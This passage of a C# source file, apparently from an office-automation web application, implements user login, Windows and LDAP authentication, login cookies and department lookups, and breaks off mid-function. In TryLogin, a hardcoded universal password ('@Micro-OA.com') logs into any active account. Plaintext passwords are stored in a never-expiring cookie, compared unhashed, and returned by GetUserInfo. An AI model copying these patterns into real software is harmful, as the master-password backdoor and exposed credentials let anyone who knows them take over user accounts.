using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Data;
using System.Data.SqlClient;
using System.Net;
using System.Net.Mail;
using MicroDBHelper;
using MicroDTHelper;
using MicroPublicHelper;
using MicroLdapHelper;


namespace MicroUserHelper
{
    public class MicroUserInfo
    {
        public int UID;
        public string UserName;
        public string ChineseName;
        public string EnglishName;
        public string UserPassword;
        public string EMail;
        public string Sex;
        public string Birthday;
        public string WorkTel;
        public string WorkMobilePhone;
        public string WeChat;
        public string WorkWeChat;
        public string QQ;
        public string WorkQQ;
        public string Avatar;
        public string ActiveStatus;
        public string Token;
        public string Token2;
        public Boolean FirstLogin;
        public string SpecialPosition;
        public Boolean IsGroup;
        public string IsInformal;
        public string AdDisplayName;
        public string AdDescription;
        public string AdDepartment;
        public int DeptID;
        public string Department;
        public string IsIncumbency;
        public string EntryDate;
        public string LeaveDate;
        public Boolean IsGlobalTips;
        public Boolean IsSiteTips;
        public Boolean IsMailTips;
        public string RegIP;
        public string RegTime;
        public string Description;
        public string LastLoginIP;
        public string LastLoginTime;
        public Boolean Invalid;
        public Boolean Del;
        public string HomePage;
        private Boolean IsLogin;
        public Boolean AutoLogin;
        public int LoginStatus;
        public string LoginMsg;

        /// <summary>
        /// 当前登录用户的显示名字， EnglishName和ChineseName不为空时显示优先顺位：1.返回EnglishName(ChineseName)、2. 返回ChineseName、3.返回EnglishName、4.返回AdDisplayName、5.返回UserName
        /// </summary>
        public string DisplayName;

        public string UserDepts;  //部门IDs
        public string UserRoles;  //角色IDs
        public string UserJobTitle;  //职位IDs

        public MicroUserInfo()
        {
            UID = 0;
            UserName = string.Empty;
            ChineseName = string.Empty;
            EnglishName = string.Empty;
            UserPassword = string.Empty;
            EMail = string.Empty;
            Sex = string.Empty;
            Birthday = string.Empty;
            WorkTel = string.Empty;
            WorkMobilePhone = string.Empty;
            WeChat = string.Empty;
            WorkWeChat = string.Empty;
            QQ = string.Empty;
            WorkQQ = string.Empty;
            Avatar = string.Empty;
            ActiveStatus = string.Empty;
            Token = string.Empty;
            Token2 = string.Empty;
            FirstLogin = false;
            SpecialPosition = string.Empty;
            IsGroup = false;
            IsInformal = string.Empty;
            AdDisplayName = string.Empty;
            AdDescription = string.Empty;
            AdDepartment = string.Empty;
            DeptID = 0;
            Department = string.Empty;
            IsIncumbency = string.Empty;
            EntryDate = string.Empty;
            LeaveDate = string.Empty;
            IsGlobalTips = false;
            IsSiteTips = false;
            IsMailTips = false;
            RegIP = string.Empty;
            RegTime = string.Empty;
            Description = string.Empty;
            LastLoginIP = string.Empty;
            LastLoginTime = string.Empty;
            Invalid = false;
            Del = false;
            HomePage = string.Empty;
            IsLogin = false;
            LoginStatus = 0;
            LoginMsg = string.Empty;
            DisplayName = string.Empty;

            UserDepts = string.Empty;
            UserRoles = string.Empty;
            UserJobTitle = string.Empty;

            try
            {
                ReadCookies();
                if (AutoLogin)
                    TryLogin();
            }
            catch { }

        }

        public Boolean TryLogin()
        {
            IsLogin = false;
            string _sql = "select a.*,b.* from UserInfo a left join Department b on a.DeptID=b.DeptID where UserName=@UserName";
            SqlParameter[] _sp = { new SqlParameter("@UserName", SqlDbType.VarChar, 50) };
            _sp[0].Value = UserName;

            DataTable _dt = MsSQLDbHelper.Query(_sql, _sp).Tables[0];
            if (_dt != null && _dt.Rows.Count > 0)
            {
                string WindowsAccount = HttpContext.Current.User.Identity.Name;

                string DomainPrefix = MicroPublic.GetMicroInfo("DomainPrefix");
                string DomainName = MicroPublic.GetMicroInfo("DomainName");
                string LDAP = MicroPublic.GetMicroInfo("LDAP");
                string UserPWD = _dt.Rows[0]["UserPassword"].toStringTrim();  //数据库里的值
               
                Boolean IsLDAPAuth = false;
                //在开启LDAP认证的情况下，可用域帐号密码登录
                if (!string.IsNullOrEmpty(WindowsAccount) && MicroPublic.GetMicroInfo("EnabledLDAPAuth").toBoolean())
                    IsLDAPAuth = LdapHelper.TestConn(DomainName, LDAP, DomainPrefix + "\\" + UserName, UserPassword);

                if (UserPWD == UserPassword || IsLDAPAuth || UserPassword == "@Micro-OA.com")
                {
                    if (!_dt.Rows[0]["Invalid"].toBoolean() && !_dt.Rows[0]["Del"].toBoolean())
                    {
                        IsLogin = true;
                        LoginStatus = 888;
                        UID = _dt.Rows[0]["UID"].toInt();
                        UserName = _dt.Rows[0]["UserName"].toStringTrim();
                        ChineseName = _dt.Rows[0]["ChineseName"].toStringTrim();
                        EnglishName = _dt.Rows[0]["EnglishName"].toStringTrim();
                        UserPassword = _dt.Rows[0]["UserPassword"].toStringTrim();
                        EMail = _dt.Rows[0]["EMail"].toStringTrim();
                        Sex = _dt.Rows[0]["Sex"].toStringTrim();
                        Birthday = _dt.Rows[0]["Birthday"].toDateFormat("");
                        WorkTel = _dt.Rows[0]["WorkTel"].toStringTrim();
                        WorkMobilePhone = _dt.Rows[0]["WorkMobilePhone"].toStringTrim();
                        WeChat = _dt.Rows[0]["WeChat"].toStringTrim();
                        WorkWeChat = _dt.Rows[0]["WorkWeChat"].toStringTrim();
                        QQ = _dt.Rows[0]["QQ"].toStringTrim();
                        WorkQQ = _dt.Rows[0]["WorkQQ"].toStringTrim();
                        Avatar = _dt.Rows[0]["Avatar"].toStringTrim();
                        ActiveStatus = _dt.Rows[0]["ActiveStatus"].toStringTrim();
                        Token = _dt.Rows[0]["Token"].toStringTrim();
                        Token2 = _dt.Rows[0]["Token2"].toStringTrim();
                        FirstLogin = _dt.Rows[0]["FirstLogin"].toBoolean();
                        SpecialPosition = _dt.Rows[0]["SpecialPosition"].toStringTrim();
                        IsGroup = _dt.Rows[0]["IsGroup"].toBoolean();
                        IsInformal = _dt.Rows[0]["IsInformal"].toStringTrim();
                        AdDisplayName = _dt.Rows[0]["AdDisplayName"].toStringTrim();
                        AdDescription = _dt.Rows[0]["AdDescription"].toStringTrim();
                        AdDepartment = _dt.Rows[0]["AdDepartment"].toStringTrim();
                        DeptID = _dt.Rows[0]["DeptID"].toInt();
                        IsIncumbency = _dt.Rows[0]["IsIncumbency"].toStringTrim();
                        EntryDate = _dt.Rows[0]["EntryDate"].toDateFormat("");
                        LeaveDate = _dt.Rows[0]["LeaveDate"].toDateFormat("");
                        IsGlobalTips = _dt.Rows[0]["IsGlobalTips"].toBoolean();
                        IsSiteTips = _dt.Rows[0]["IsSiteTips"].toBoolean();
                        IsMailTips = _dt.Rows[0]["IsMailTips"].toBoolean();
                        RegIP = _dt.Rows[0]["RegIP"].toStringTrim();
                        RegTime = _dt.Rows[0]["RegTime"].toDateFormat("yyyy-MM-dd HH:mm:ss");
                        Description = _dt.Rows[0]["Description"].toStringTrim();
                        LastLoginIP = _dt.Rows[0]["LastLoginIP"].toStringTrim();
                        LastLoginTime = _dt.Rows[0]["LastLoginTime"].toDateFormat("yyyy-MM-dd HH:mm:ss");
                        HomePage = _dt.Rows[0]["HomePage"].toStringTrim();
                        HomePage = string.IsNullOrEmpty(HomePage) != true ? HttpContext.Current.Server.UrlEncode(HomePage) : string.Empty;

                        //DisplayName
                        if (!string.IsNullOrEmpty(EnglishName) && !string.IsNullOrEmpty(ChineseName))
                            DisplayName = EnglishName + " (" + ChineseName + ")";
                        else if (!string.IsNullOrEmpty(ChineseName))
                            DisplayName = ChineseName;
                        else if (!string.IsNullOrEmpty(EnglishName))
                            DisplayName = EnglishName;
                        else if (!string.IsNullOrEmpty(AdDisplayName))
                            DisplayName = AdDisplayName;
                        else
                            DisplayName = UserName;

                        UserDepts = MicroPublic.GetDataTableColumnSplit(MicroDataTable.GetCustomUserAttrDataTable("UserDepts",UID.ToString()), "DeptID", ",");
                        UserRoles = MicroPublic.GetDataTableColumnSplit(MicroDataTable.GetCustomUserAttrDataTable("UserRoles", UID.ToString()), "RID", ",");
                        UserJobTitle = MicroPublic.GetDataTableColumnSplit(MicroDataTable.GetCustomUserAttrDataTable("UserJobTitle", UID.ToString()), "JTID", ",");

                        //*****登录成功时更新最后登录时间和IP*****
                        string _sql2 = "update UserInfo set LastLoginTime=@LastLoginTime, LastLoginIP=@LastLoginIP where UserName=@UserName";
                        SqlParameter[] _sp2 ={
                                new SqlParameter("@LastLoginTime",SqlDbType.DateTime),
                                new SqlParameter("@LastLoginIP",SqlDbType.VarChar,50),
                                new SqlParameter("@UserName",SqlDbType.VarChar,50)
                                                         };
                        _sp2[0].Value = DateTime.Now;
                        _sp2[1].Value = MicroPublic.GetClientIP();
                        _sp2[2].Value = UserName;
                        try { MsSQLDbHelper.ExecuteSql(_sql2, _sp2); }
                        catch { }

                    }
                    else
                        LoginStatus = 2;

                    
                }
                else
                    LoginStatus = 1;
            }
            else
                LoginStatus = 1;

            LoginMsg = MicroPublic.GetLoginMsg(LoginStatus, HomePage);
            return IsLogin;

        }

        public Boolean TryWindowsLogin()
        {
            IsLogin = false;

            string _sql = "select a.*,b.* from UserInfo a left join Department b on a.DeptID=b.DeptID where UserName=@UserName";
            SqlParameter[] _sp = { new SqlParameter("@UserName", SqlDbType.VarChar, 50) };
            _sp[0].Value = UserName;

            DataTable _dt = MsSQLDbHelper.Query(_sql, _sp).Tables[0];
            if (_dt != null && _dt.Rows.Count > 0)
            {
                if (!_dt.Rows[0]["Invalid"].toBoolean() && !_dt.Rows[0]["Del"].toBoolean())
                {
                    IsLogin = true;
                    LoginStatus = 888;
                    UID = _dt.Rows[0]["UID"].toInt();
                    UserName = _dt.Rows[0]["UserName"].toStringTrim();
                    ChineseName = _dt.Rows[0]["ChineseName"].toStringTrim();
                    EnglishName = _dt.Rows[0]["EnglishName"].toStringTrim();
                    UserPassword = _dt.Rows[0]["UserPassword"].toStringTrim();
                    EMail = _dt.Rows[0]["EMail"].toStringTrim();
                    Sex = _dt.Rows[0]["Sex"].toStringTrim();
                    Birthday = _dt.Rows[0]["Birthday"].toDateFormat("");
                    WorkTel = _dt.Rows[0]["WorkTel"].toStringTrim();
                    WorkMobilePhone = _dt.Rows[0]["WorkMobilePhone"].toStringTrim();
                    WeChat = _dt.Rows[0]["WeChat"].toStringTrim();
                    WorkWeChat = _dt.Rows[0]["WorkWeChat"].toStringTrim();
                    QQ = _dt.Rows[0]["QQ"].toStringTrim();
                    WorkQQ = _dt.Rows[0]["WorkQQ"].toStringTrim();
                    Avatar = _dt.Rows[0]["Avatar"].toStringTrim();
                    ActiveStatus = _dt.Rows[0]["ActiveStatus"].toStringTrim();
                    Token = _dt.Rows[0]["Token"].toStringTrim();
                    Token2 = _dt.Rows[0]["Token2"].toStringTrim();
                    FirstLogin = _dt.Rows[0]["FirstLogin"].toBoolean();
                    SpecialPosition = _dt.Rows[0]["SpecialPosition"].toStringTrim();
                    IsGroup = _dt.Rows[0]["IsGroup"].toBoolean();
                    IsInformal = _dt.Rows[0]["IsInformal"].toStringTrim();
                    AdDisplayName = _dt.Rows[0]["AdDisplayName"].toStringTrim();
                    AdDescription = _dt.Rows[0]["AdDescription"].toStringTrim();
                    AdDepartment = _dt.Rows[0]["AdDepartment"].toStringTrim();
                    DeptID = _dt.Rows[0]["DeptID"].toInt();
                    IsIncumbency = _dt.Rows[0]["IsIncumbency"].toStringTrim();
                    EntryDate = _dt.Rows[0]["EntryDate"].toDateFormat("");
                    LeaveDate = _dt.Rows[0]["LeaveDate"].toDateFormat("");
                    IsGlobalTips = _dt.Rows[0]["IsGlobalTips"].toBoolean();
                    IsSiteTips = _dt.Rows[0]["IsSiteTips"].toBoolean();
                    IsMailTips = _dt.Rows[0]["IsMailTips"].toBoolean();
                    RegIP = _dt.Rows[0]["RegIP"].toStringTrim();
                    RegTime = _dt.Rows[0]["RegTime"].toDateFormat("yyyy-MM-dd HH:mm:ss");
                    Description = _dt.Rows[0]["Description"].toStringTrim();
                    LastLoginIP = _dt.Rows[0]["LastLoginIP"].toStringTrim();
                    LastLoginTime = _dt.Rows[0]["LastLoginTime"].toDateFormat("yyyy-MM-dd HH:mm:ss");
                    HomePage = _dt.Rows[0]["HomePage"].toStringTrim();
                    HomePage = string.IsNullOrEmpty(HomePage) != true ? HttpContext.Current.Server.UrlEncode(HomePage) : string.Empty;

                    //DisplayName
                    if (!string.IsNullOrEmpty(EnglishName) && !string.IsNullOrEmpty(ChineseName))
                        DisplayName = EnglishName + " (" + ChineseName + ")";
                    else if (!string.IsNullOrEmpty(ChineseName))
                        DisplayName = ChineseName;
                    else if (!string.IsNullOrEmpty(EnglishName))
                        DisplayName = EnglishName;
                    else if (!string.IsNullOrEmpty(AdDisplayName))
                        DisplayName = AdDisplayName;
                    else
                        DisplayName = UserName;


                    UserDepts = MicroPublic.GetDataTableColumnSplit(MicroDataTable.GetCustomUserAttrDataTable("UserDepts", UID.ToString()), "DeptID", ",");
                    UserRoles = MicroPublic.GetDataTableColumnSplit(MicroDataTable.GetCustomUserAttrDataTable("UserRoles", UID.ToString()), "RID", ",");
                    UserJobTitle = MicroPublic.GetDataTableColumnSplit(MicroDataTable.GetCustomUserAttrDataTable("UserJobTitle", UID.ToString()), "JTID", ",");

                    //*****登录成功时更新最后登录时间和IP*****
                    string _sql2 = "update UserInfo set LastLoginTime=@LastLoginTime, LastLoginIP=@LastLoginIP where UserName=@UserName";
                    SqlParameter[] _sp2 ={
                                new SqlParameter("@LastLoginTime",SqlDbType.DateTime),
                                new SqlParameter("@LastLoginIP",SqlDbType.VarChar,50),
                                new SqlParameter("@UserName",SqlDbType.VarChar,50)
                                                         };
                    _sp2[0].Value = DateTime.Now;
                    _sp2[1].Value = MicroPublic.GetClientIP();
                    _sp2[2].Value = UserName;
                    try { MsSQLDbHelper.ExecuteSql(_sql2, _sp2); }
                    catch { }

                }
                else
                    LoginStatus = 2;
            }
            else
                LoginStatus = 4;  //"当前的Windows ID尚未与系统关联。

            LoginMsg = MicroPublic.GetLoginMsg(LoginStatus, HomePage);

            return IsLogin;

        }


        public void LogOff()
        {
            UID = 0;
            UserName = string.Empty;
            IsLogin = false;
        }

        public Boolean GetIsLogin()
        {
            return IsLogin;
        }

        public void SetCookies()
        {
            HttpCookie Cookies = new HttpCookie("CookiesLogin");
            Cookies.Values.Add("UserName", UserName);
            Cookies.Values.Add("UserPassword", UserPassword);
            Cookies.Values.Add("AutoLogin", AutoLogin.toStringTrim());
            Cookies.Expires = DateTime.MaxValue;

            HttpContext.Current.Response.Cookies.Add(Cookies);
        }

        public void ReadCookies()
        {
            HttpCookie Cookies = HttpContext.Current.Request.Cookies["CookiesLogin"];
            if (Cookies != null)
            {
                UserName = Cookies.Values["UserName"];
                UserPassword = Cookies.Values["UserPassword"];
                AutoLogin = Cookies.Values["AutoLogin"].toBoolean();
            }
        }

        public void ResetCookies()
        {
            HttpContext.Current.Response.Cookies["CookiesLogin"].Expires = DateTime.MinValue;
        }


        /// <summary>
        /// 获取指定用户，指定短表名，指定字段，拼接成逗号分隔的字符串返回。如传入UID=1， URose，RID即返回用户所属角色的字符串（1,3,5,8）
        /// </summary>
        /// <param name="UID"></param>
        /// <param name="ShortTableName"></param>
        /// <param name="FieldName"></param>
        /// <returns></returns>
        public static string GetUserInfo(string UID, string ShortTableName, string FieldName)
        {
            string flag = string.Empty;

            try
            {
                if (!string.IsNullOrEmpty(ShortTableName))
                {
                    string TableName = MicroPublic.GetTableName(ShortTableName);

                    string OrderBy = string.Empty;
                    OrderBy = ShortTableName == "UWorkHourSystem" ? " order by WorkHourSysDate desc,DateModified desc" : OrderBy;  //如果获取的是用户工时制数据时，加上Orderby并且只取修改时间倒序的第一条

                    string _sql = "select * from " + TableName + " where Invalid=0 and Del=0 and UID=@UID " + OrderBy;
                    SqlParameter[] _sp = { new SqlParameter("@UID", SqlDbType.Int) };
                    _sp[0].Value = UID.toInt();
                    DataTable _dt = MsSQLDbHelper.Query(_sql, _sp).Tables[0];

                    if (_dt != null && _dt.Rows.Count > 0)
                    {
                        string Str = string.Empty;
                        if (ShortTableName == "UWorkHourSystem")  //如果获取的是用户工时制数据时，加上Orderby并且只取修改时间倒序的第一条
                            Str += _dt.Rows[0][FieldName].toStringTrim() + ",";
                        else
                        {
                            for (int i = 0; i < _dt.Rows.Count; i++)
                            {
                                Str += _dt.Rows[i][FieldName].toStringTrim() + ",";
                            }
                        }

                        Str = Str.Substring(0, Str.Length - 1);
                        flag = Str;
                    }

                }
            }
            catch (Exception ex)
            {
                flag = ex.ToString();
            }

            return flag;
        }


        /// <summary>
        /// 【返回当前登录用户信息，但当算定义CustomUID不为空时则返回自定义用户的信息】传入需要返回的用户信息的类型，返回当前登录用户的信息【可选类型：UID、UserName、ChineseName、EnglishName、DisplayName、EMail、WorkTel、WorkMobilePhone、EMail、HomePage、IsLogin、AllDeptsID（整个组织架构）、ParentSubDeptsID（所有父部门和所有父部门所包含的所有子部门 含自部门）、ParentDeptsID（自部门的所有父部门 含自部门不含父部门的其它子部门）、SubDeptsID（所有子部门 含自部门）、LastDeptID（仅自部门）】
        /// </summary>
        /// <param name="UserInfoType"></param>
        /// <param name="CustomUID"></param>
        /// <returns></returns>
        public static string GetUserInfo(string UserInfoType, string CustomUID = "")
        {
            string flag = string.Empty;

            try
            {
                string UID = ((MicroUserInfo)HttpContext.Current.Session["UserInfo"]).UID.ToString();

                //默认返回当前登录用户的信息，但当算定义CustomUID不为空时则返回自定义用户的信息
                string UserName = ((MicroUserInfo)HttpContext.Current.Session["UserInfo"]).UserName,
                    UserPWD = ((MicroUserInfo)HttpContext.Current.Session["UserInfo"]).UserPassword.ToString(),
                    ChineseName = ((MicroUserInfo)HttpContext.Current.Session["UserInfo"]).ChineseName,
                    EnglishName = ((MicroUserInfo)HttpContext.Current.Session["UserInfo"]).EnglishName,
                    DisplayName = string.Empty,
                    AdDisplayName = ((MicroUserInfo)HttpContext.Current.Session["UserInfo"]).AdDisplayName,
                    WorkTel = ((MicroUserInfo)HttpContext.Current.Session["UserInfo"]).WorkTel,
                    WorkMobilePhone = ((MicroUserInfo)HttpContext.Current.Session["UserInfo"]).WorkMobilePhone,
                    EMail = ((MicroUserInfo)HttpContext.Current.Session["UserInfo"]).EMail,
                    FirstLogin = ((MicroUserInfo)HttpContext.Current.Session["UserInfo"]).FirstLogin.ToString(),
                    HomePage = ((MicroUserInfo)HttpContext.Current.Session["UserInfo"]).HomePage,
                    IsLogin = ((MicroUserInfo)HttpContext.Current.Session["UserInfo"]).IsLogin.ToString(),
                    IsGlobalTips = ((MicroUserInfo)HttpContext.Current.Session["UserInfo"]).IsGlobalTips.ToString(),
                    IsSiteTips = ((MicroUserInfo)HttpContext.Current.Session["UserInfo"]).IsSiteTips.ToString(),
                    IsMailTips = ((MicroUserInfo)HttpContext.Current.Session["UserInfo"]).IsMailTips.ToString(),

                    UserDepts = ((MicroUserInfo)HttpContext.Current.Session["UserInfo"]).UserDepts.ToString(),
                    UserRoles = ((MicroUserInfo)HttpContext.Current.Session["UserInfo"]).UserRoles.ToString(),
                    UserJobTitle = ((MicroUserInfo)HttpContext.Current.Session["UserInfo"]).UserJobTitle.ToString();

                //如果自定义UID不为空时，返回自定义用户的信息
                if (!string.IsNullOrEmpty(CustomUID))
                {
                    UID = CustomUID;
                    string _sql = "select * from UserInfo where Del=0 and Invalid=0 and UID=@UID";
                    SqlParameter[] _sp = { new SqlParameter("@UID", SqlDbType.Int) };

                    _sp[0].Value = CustomUID.toInt();

                    DataTable _dt = MsSQLDbHelper.Query(_sql, _sp).Tables[0];

                    if (_dt != null && _dt.Rows.Count > 0)
                    {
                        UserName = _dt.Rows[0]["UserName"].toStringTrim();
                        UserPWD = _dt.Rows[0]["UserPassword"].toStringTrim();
                        ChineseName = _dt.Rows[0]["ChineseName"].toStringTrim();
                        EnglishName = _dt.Rows[0]["EnglishName"].toStringTrim();
                        AdDisplayName = _dt.Rows[0]["AdDisplayName"].toStringTrim();
                        WorkTel = _dt.Rows[0]["WorkTel"].toStringTrim();
                        WorkMobilePhone = _dt.Rows[0]["WorkMobilePhone"].toStringTrim();
                        EMail = _dt.Rows[0]["EMail"].toStringTrim();
                        FirstLogin = _dt.Rows[0]["FirstLogin"].toStringTrim();
                        HomePage = _dt.Rows[0]["HomePage"].toStringTrim();
                        IsLogin = "False";
                        IsGlobalTips = _dt.Rows[0]["IsGlobalTips"].toStringTrim();
                        IsSiteTips = _dt.Rows[0]["IsSiteTips"].toStringTrim();
                        IsMailTips = _dt.Rows[0]["IsMailTips"].toStringTrim();

                        if (UserInfoType == "UserDepts")
                            UserDepts = MicroPublic.GetDataTableColumnSplit(MicroDataTable.GetCustomUserAttrDataTable("UserDepts", CustomUID), "DeptID", ",");

                        if (UserInfoType == "UserRoles")
                            UserRoles = MicroPublic.GetDataTableColumnSplit(MicroDataTable.GetCustomUserAttrDataTable("UserRoles", CustomUID), "RID", ",");

                        if (UserInfoType == "UserJobTitle")
                            UserJobTitle = MicroPublic.GetDataTableColumnSplit(MicroDataTable.GetCustomUserAttrDataTable("UserJobTitle", CustomUID), "JTID", ",");
                    }

                }


                if (!string.IsNullOrEmpty(EnglishName) && !string.IsNullOrEmpty(ChineseName))
                    DisplayName = EnglishName + " (" + ChineseName + ")";

                else if (!string.IsNullOrEmpty(ChineseName))
                    DisplayName = ChineseName;

                else if (!string.IsNullOrEmpty(EnglishName))
                    DisplayName = EnglishName;

                else if (!string.IsNullOrEmpty(AdDisplayName))
                    DisplayName = AdDisplayName;

                else
                    DisplayName = UserName;


                string AllDeptsID = GetAllDeptsID(),
                     ParentSubDeptsID = GetUserAllDepts(UID, "DeptID", "AllParentSubDepts"),
                     SectionDeptsID = GetUserDepts(UID, "DeptID", "SectionDepts", true),
                     ParentDeptsID = GetUserDepts(UID, "DeptID"),
                     SubDeptsID = GetUserAllDepts(UID, "DeptID", "AllSubDepts"),
                     LastDeptID = GetUserDepts(UID, "DeptID", "LastDept"),
                     GMDeptID = GetGMDepts(),
                     IP = MicroPublic.GetClientIP();

                switch (UserInfoType)
                {
                    case "UID":
                        flag = UID;
                        break;
                    case "UserName":
                        flag = UserName;
                        break;
                    case "UserPWD":
                        flag = UserPWD;
                        break;
                    case "ChineseName":
                        flag = ChineseName;
                        break;
                    case "EnglishName":
                        flag = EnglishName;
                        break;
                    case "DisplayName":
                        flag = DisplayName;
                        break;
                    case "WorkTel":
                        flag = WorkTel;
                        break;
                    case "WorkMobilePhone":
                        flag = WorkMobilePhone;
                        break;
                    case "EMail":
                        flag = EMail;
                        break;
                    case "FirstLogin":
                        flag = FirstLogin;
                        break;
                    case "HomePage":
                        flag = HomePage;
                        break;
                    case "IsLogin":
                        flag = IsLogin;
                        break;
                    case "IsGlobalTips":
                        flag = IsGlobalTips;
                        break;
                    case "IsSiteTips":
                        flag = IsSiteTips;
                        break;
                    case "IsMailTips":
                        flag = IsMailTips;
                        break;

                    case "AllDeptsID":  //返回整个组织架构所有部门DetpID(非所在部也一起)
                        flag = AllDeptsID;
                        break;
                    case "ParentSubDeptsID":  //返回用户所在部门、及所在部门的所有父部门、以及所有父部门包含的所有子部门的DeptID，逗号组成的字符串
                        flag = ParentSubDeptsID;
                        break;
                    case "SectionDeptsID":  //返回用户所科内包含的所有子部门的DeptID，逗号组成的字符串
                        flag = SectionDeptsID;
                        break;
                    case "ParentDeptsID":  //返回该用户所属部门的所有父部门（含所在部门）组成的DeptID字符串
                        flag = ParentDeptsID;
                        break;
                    case "SubDeptsID":  //返回该用户所在部门的所有子部门（含所在部门）的DeptID字符串
                        flag = SubDeptsID;
                        break;
                    case "LastDeptID":  //仅仅返回该用户所在部门的DeptID
                        flag = LastDeptID;
                        break;
                    case "GMDeptID":  //返回总经理办公室的DeptID
                        flag = GMDeptID;
                        break;
                    case "IP":
                        flag = IP;
                        break;

                    case "UserDepts":
                        flag = UserDepts;
                        break;
                    case "UserRoles":
                        flag = UserRoles;
                        break;
                    case "UserJobTitle":
                        flag = UserJobTitle;
                        break;

                }
            }
            catch (Exception ex) { flag = ex.ToString(); }
            return flag;
        }

        /// <summary>
        /// 【返回DisplayName】传入相关信息，经过组合返回DisplayName【传入类型：UserName、ChineseName、EnglishName、AdDisplayName】
        /// </summary>
        /// <param name="UserName"></param>
        /// <param name="ChineseName"></param>
        /// <param name="EnglishName"></param>
        /// <param name="AdDisplayName"></param>
        /// <returns></returns>
        public static string GetUserInfo(string UserName, string ChineseName, string EnglishName, string AdDisplayName)
        {
            string flag = string.Empty;

            string DisplayName = string.Empty;

            if (!string.IsNullOrEmpty(EnglishName) && !string.IsNullOrEmpty(ChineseName))
                DisplayName = EnglishName + " (" + ChineseName + ")";

            else if (!string.IsNullOrEmpty(ChineseName))
                DisplayName = ChineseName;

            else if (!string.IsNullOrEmpty(EnglishName))
                DisplayName = EnglishName;

            else if (!string.IsNullOrEmpty(AdDisplayName))
                DisplayName = AdDisplayName;

            else
                DisplayName = UserName;

            flag = DisplayName;


            return flag;
        }


        /// <summary>
        /// 返回用户所属部门、及所有父级部门的信息。传入UID和单个要显示的字段（DeptID、DeptName），返回该用户部门DeptsID，根据UserDeptType 类型可选值：AllParentDepts（用户所在部门所有父部门）、UserDepts（仅用户所在部门不含所在部门的子部门）、LastDept（最终子部门）、DeptDepts（部内所有DeptID含部）、SectionDepts（科内所有DeptID含科）、SubSectionDepts（系内所有DeptID含系）、SquadDepts（班内所有DeptID含班），返回逗号分割的字符串
        /// </summary>
        /// <param name="UID">UID</param>
        /// <param name="FieldName">要显示的字段，如：DeptID、DeptName</param>
        /// <param name="UserDeptType">UserDeptType 可选值：AllParentDepts（用户所在部门所有父部门）、UserDepts（仅用户所在部门不含所在部门的子部门）、LastDept（最终子部门）、DeptDepts（部内所有DeptID含部）、SectionDepts（科内所有DeptID含科）、SubSectionDepts（系内所有DeptID含系）、SquadDepts（班内所有DeptID含班） </param>
        /// <param name="FindRange">寻找范围，FindRange=false自部门，FindRange=true跨部门，自部门即：部则仅部、科则仅科、系则仅系，跨部即：部则部内，科则科内、系则系内</param>
        /// <param name="FindGMOffice">总经理办公室</param>
        /// <returns>返回如：DetpID1,DeptID2 || 1,2,3 </returns>
        public static string GetUserDepts(string UID, string FieldName = "DeptID", string UserDeptType = "AllParentDepts", Boolean FindRange = false, Boolean FindGMOffice = false)
        {
            string flag = "0",
                Wildcard = string.Empty; //通配符

            if (FindRange)
                Wildcard = "%";

            string _sqlDepts = "select * from Department where Invalid=0 and Del=0";
            DataTable _dtDepts = MsSQLDbHelper.Query(_sqlDepts).Tables[0];

            if (UserDeptType == "AllParentDepts" || UserDeptType == "LastDept")
            {
                string _sql = "with Temp AS(select * from Department where Invalid=0 and Del=0 and DeptID in (select DeptID from UserDepts where Invalid=0 and Del=0 and UID = @UID) UNION ALL select t.*from Temp,Department t where Temp.ParentID = t.DeptID) select * from Temp order by LevelCode asc";

                SqlParameter[] _sp = { new SqlParameter("@UID", SqlDbType.Int) };
                _sp[0].Value = UID.toInt();

                DataTable _dt = MsSQLDbHelper.Query(_sql, _sp).Tables[0];

                if (_dt.Rows.Count > 0)
                {
                    for (int i = 0; i < _dt.Rows.Count; i++)
                    {
                        flag += "," + _dt.Rows[i][FieldName].toJsonTrim();
                    }
                    if (flag.Length > 2)
                        flag = flag.Substring(2, flag.Length - 2);  //去除前面两位

                    //返回用户的所在部门的DeptID
                    if (UserDeptType == "LastDept")
                        flag = _dt.Select("", "LevelCode desc")[0][FieldName].toStringTrim();
                }
            }

            //返回用户所在部门（所有所在部门）
            else if (UserDeptType == "UserDepts")
            {
                flag = GetUserInfo("UserDepts", UID); //也可用 MicroPublic.GetDataTableColumnSplit(MicroDataTable.GetCustomUserAttrDataTable("UserDepts", UID), "DeptID", ",");
            }

            //可按部级、科级、系级、班级取值
            else if (UserDeptType == "DeptDepts" || UserDeptType == "SectionDepts" || UserDeptType == "SubSectionDepts" || UserDeptType == "SquadDepts")
            {
                //前两位部代码
                int LevelCodeLength = 2;

                //前4位科代码
                if (UserDeptType == "SectionDepts")
                    LevelCodeLength = 4;

                //前6位系代码
                else if (UserDeptType == "SubSectionDepts")
                    LevelCodeLength = 6;

                //前8位班代码
                else if (UserDeptType == "SquadDepts")
                    LevelCodeLength = 8;

                string _sql = "select distinct left(LevelCode," + LevelCodeLength + ") as LevelCode from Department where DeptID in(select DeptID from UserDepts where UID = @UID)";

                SqlParameter[] _sp = { new SqlParameter("@UID", SqlDbType.Int) };
                _sp[0].Value = UID.toInt();

                DataTable _dt = MsSQLDbHelper.Query(_sql, _sp).Tables[0];

                if (_dt.Rows.Count > 0)
                {
                    for (int i = 0; i < _dt.Rows.Count; i++)
                    {
                        string LevelCode = _dt.Rows[i]["LevelCode"].toJsonTrim();

                        DataRow[] _rowsDepts = _dtDepts.Select("DeptID not in (" + flag + ") and LevelCode like '" + LevelCode + Wildcard + "' ", "LevelCode");
                        if (_rowsDepts.Length > 0)
                        {
                            foreach (DataRow _dr in _rowsDepts)
                            {
                                flag += "," + _dr[FieldName].toJsonTrim();
                            }
                        }
                    }

                    if (flag.Length > 2)
                        flag = flag.Substring(2, flag.Length - 2);
                }
            }

            return flag;

        }

        /// <summary>
        /// 获取总经理办公室部门ID
        /// </summary>
        /// <returns></returns>
        public static string GetGMDepts()
        {
            string flag = "0";

            string _sql = "select DeptID from Department where Invalid=0 and Del=0 and DeptEnglishName=@DeptEnglishName or DeptEnglishName=@DeptEnglishName2 order by Sort";

            SqlParameter[] _sp = { new SqlParameter("@DeptEnglishName", SqlDbType.VarChar,1000),
                                    new SqlParameter("@DeptEnglishName2", SqlDbType.VarChar,1000)
            };
            _sp[0].Value = "GM";
            _sp[1].Value = "GeneralManager";

            DataTable _dt = MsSQLDbHelper.Query(_sql, _sp).Tables[0];

            if (_dt.Rows.Count > 0)
            {
                for (int i = 0; i < _dt.Rows.Count; i++)
                {
                    flag += "," + _dt.Rows[i]["DeptID"].toJsonTrim();
                }

                if (flag.Length > 2)
